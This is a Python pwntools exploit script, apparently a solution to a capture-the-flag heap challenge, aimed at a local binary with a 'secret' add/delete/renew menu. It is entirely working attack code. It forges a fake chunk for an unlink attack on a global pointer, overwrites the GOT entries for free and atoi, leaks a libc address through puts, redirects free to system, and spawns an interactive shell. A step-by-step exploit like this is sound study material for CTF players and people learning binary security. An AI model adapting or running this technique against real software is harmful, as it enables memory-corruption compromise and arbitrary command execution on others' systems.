from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample6')
p = process('./data/sample6')
libc = elf.libc
f_ptr = 0x6020d0
atoi_GOT = elf.got['atoi']
free_GOT = elf.got['free']
puts_GOT = elf.got['puts']
puts_plt = elf.plt['puts']
atoi_offset = 0x36e70
system_offset = 0x45380

def add(t, s):
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'1')
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())
    p.recvuntil(b': \n')
    p.send(s)

def de(t):
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'2')
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())

def update(t, s):
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'3')
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())
    p.recvuntil(b': \n')
    p.send(s)

add(1, b'a');add(2, b'a');de(1)#step.1
add(3, b'a')#step.2
de(1)#step.3
fake_chunk = p64(0) + p64(0x21) + p64(f_ptr - 0x18) + p64(f_ptr-0x10) + b'\x20';add(1, fake_chunk)#step.4
de(2)#step.5
f = p64(0) + p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT) + p32(1)*3;update(1, f)#step.6
update(1, p64(puts_plt))#step.7
de(2);s = p.recv(6)#step.8
libc_base = u64(s.ljust(8, b'\x00')) - atoi_offset;system = libc_base + system_offset;update(1, p64(system))#step.9
add(2, b'sh\0')#step.10
de(2)#step.11
p.interactive()#step.12